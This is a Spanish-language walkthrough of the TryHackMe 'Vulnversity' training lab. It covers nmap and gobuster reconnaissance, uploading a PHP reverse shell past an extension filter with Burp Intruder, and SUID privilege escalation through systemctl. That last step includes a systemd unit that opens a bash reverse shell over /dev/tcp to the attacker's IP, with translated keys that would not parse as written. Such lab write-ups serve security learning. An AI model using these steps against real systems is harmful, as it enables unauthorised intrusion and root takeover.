# VULNVERSITY

Esta es la primera máquina que nos ponen en tryhackme para que te enseñen un poco a reconocerla y creo que siempre viene bien para recordar conceptos

# INICIO

Primero de todo simplemente nos dice que nos conectemos e iniciemos la máquina

![image](https://github.com/user-attachments/assets/2d437024-d123-4f63-8f36-833cee6b0b0c)

Posteriomente nos dicen como hacer reconocimiento y usar la red para escanear con Nmap.

## CONECTAR A LA MÁQUINA

## ESCANEAR LA MÁQUINA

```
nmap -sV 10.10.26.150
```

![image](https://github.com/user-attachments/assets/86dba4af-bec5-487d-b257-d627250c8587)


Nmap es gratis, código abierto y una herramienta poderosa para descubrir hosts y servicios que corren en la red. En nuestr ejemplo usamos nmap para escanear e identificar servicios de un puerto en especifico. Nmap tiene bastantes capacidades.

![image](https://github.com/user-attachments/assets/0ba06b68-cde3-43bb-b909-ec0d87e56630)

### PREGUNTAS

![image](https://github.com/user-attachments/assets/9b5bb26d-0916-4ac2-956f-08dba370934d)

Escanea la máquina, cuántos puertos abiertos tiene?

- 6

Que versión de squid proxy esta ejecutandose en la máquina?

- Squid http proxy 3.5.12

Cuantos puertos puede escanear Nmap si utiliza -p-400?

- 400

Cual es el sistema operativo más usado en la máquina?

- Ubuntu

Que puesto esta utilizando el servidor web para ejecutarse?

- 3333 (apache)

Cual es la extensión para que Nmap utilice el verbose?

- "-v"

## LOCALIZAR DIRECTORIOS USANDO GOBUSTER

Usar la herramienta "Gobuster" para descubrir directorios rapidamente, lo podemos encontrar en un directorio y utilizarlo en una shell.

Vamos a empezara escanear una red y los directorios ocultos.

Gobuster es una herramienta que utiliza las URL y hace fuerza bruta a los directorios y ficheros, subdominios por DNS y host virutales. 

si queremos descargar gobuster

```
sudo apt-get install gobuster
```

Para empezar necesitaremos uan wordlist para gobuster, normalmente lo tenemos en /usr/share/wordlists/

```
gobuster dir -u http://10.10.31.50:3333 -w
```

![image](https://github.com/user-attachments/assets/7e766d7d-7b4f-48cd-9aaf-a0fedd891597)


![image](https://github.com/user-attachments/assets/b3bd3d3b-9c6a-4623-8f76-990ed371e84b)

## COMPROMETER LA APLICACIÓN WEB

Ahora que tenemos el directorio donde se sube todo /internal/, podemos probar a subir un payload e ejecutarlo.

Podemos utilizar BurpSuite.

### USAR BURPSUITE

Vamos a usar "intruder" para customatizar atauqes utilizando estas extensiones.

- .php
- .php3
- .php4
- .php5
- .phtml

![image](https://github.com/user-attachments/assets/dd39e327-0426-4157-aae6-05927be85ee9)

Ahora ya con burpsuite configurado vamos a intercentar el trafico del navegador. Descargarnos el fichero de la consulta y capturarlo, mandarlo al intrude y clickar dentro de "Payloads" y seleccionar "Sniper" como modo de ataque

Clicar en la "posicion" y añadir el archivo de extension 

![image](https://github.com/user-attachments/assets/88548c6b-4b7b-4fe8-9c69-834142dca937)

Ahora podemos empezar a hacer el payload

## CONSEGUIR UNA REVERSE SHELL

Ahora vamos a hacer una shell reversa por PHP. funciona en el que el host remoto fuerza una conexión con tigo. Nosotros nos ponemos escuchandos, subimos y ejecutamos la shell. [RevShell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Para ganaer acceso remoto cogemos esa shell

1 - Lo editamos para cambiar la ip
2 - Lo renombramos a php-reverse-shell.phtml
3 - Iniciamos un listener "nc -lvnp 1234"
4 - Subimos la shell navegando a la ruta y lo ejecutamos

![image](https://github.com/user-attachments/assets/9c98f8ec-1c13-4707-be0a-8a215de8fa18)


## ESCALA DE PRIVILEGIOS

Ahora que hemos comprometido la máquina, nosotros necesitaremos escalar nuestros privilegios y ser root.

En Linux, el SUID(set owner userID upon execution) es un tipo de permiso particular del os ficheros. los SUID dan temporalmente permisos para que el usuario pueda ejecutar un programa o fichero con el permiso del creados.

Por ejemplo, un binario que quieras cambiar la contraseña con el SUID puede ejecutar /usr/bin/passwd. Esto es porque cambiar nuestra contraseña solo lo podria hacer un root.

![image](https://github.com/user-attachments/assets/d697b692-4220-4169-8c3d-5575498532ac)

Comando para buscar archivos SUID

```
find / -user root -perm -4000 -exec ls -ldb {} \;
```

![image](https://github.com/user-attachments/assets/543bfea8-c2db-42a2-bc73-8d4674325057)

Al descubrir la vulnerabilidad de systemctl que puede ejecutar o cambiar servicios, vamos a crear uno

```
[unidad] 
Descripción=root 

[Servicio] 
Tipo=simple 
Usuario=root 
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.6.114.60/5555 0>&1''bash -i >& /dev/tcp/10.6.114.60/5555 0>&1'

 [Instalar] 
WantedBy=multi-user.target
```

![image](https://github.com/user-attachments/assets/65d053a0-b2d3-4ea7-bd16-f911488ed9b5)

Conseguimos entrar y gg



